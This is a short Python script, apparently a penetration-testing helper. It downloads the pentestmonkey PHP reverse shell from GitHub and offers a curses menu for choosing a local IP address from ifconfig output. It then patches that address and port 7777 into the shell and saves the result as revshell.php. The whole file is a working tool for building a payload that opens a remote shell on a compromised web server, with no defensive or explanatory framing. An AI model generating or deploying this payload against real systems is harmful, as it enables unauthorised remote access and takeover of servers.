#!/usr/bin/python3

import re
import subprocess
import requests
import curses

port = "7777" # change if you want to ^^
url = "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"

def modify(sip):
    response = requests.get(url)
    if response.status_code == 200:
        php_code = response.text.replace("127.0.0.1", sip).replace("1234", port)
        with open("revshell.php", "w") as file:
            file.write(php_code)
    else:
        print("[!] failed to fetch remote content!")

def get_ip_addresses():
    output = subprocess.check_output(['ifconfig']).decode()
    ip_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
    ip_addresses = re.findall(ip_pattern, output)
    ip_addresses = [ip for ip in ip_addresses if not ip.startswith('255')]
    ip_addresses = list(set(ip_addresses))
    ip_addresses.insert(0, 'localhost')
    return ip_addresses

def choose_ip_address(stdscr, ip_addresses):
    curses.curs_set(0)
    curses.noecho()
    stdscr.keypad(True)
    current_row = 0
    num_rows = len(ip_addresses)
    while True:
        stdscr.clear()
        for i, ip_address in enumerate(ip_addresses):
            if i == current_row:
                stdscr.addstr(ip_address, curses.A_REVERSE)
            else:
                stdscr.addstr(ip_address)
            stdscr.addstr("\n")
        key = stdscr.getch()
        if key == curses.KEY_UP and current_row > 0:
            current_row -= 1
        elif key == curses.KEY_DOWN and current_row < num_rows - 1:
            current_row += 1
        elif key == curses.KEY_ENTER or key in [10, 13]:
            return ip_addresses[current_row]


if __name__ == "__main__":
    ip_addresses = get_ip_addresses()
    sip = curses.wrapper(choose_ip_address, ip_addresses)
    modify(sip)
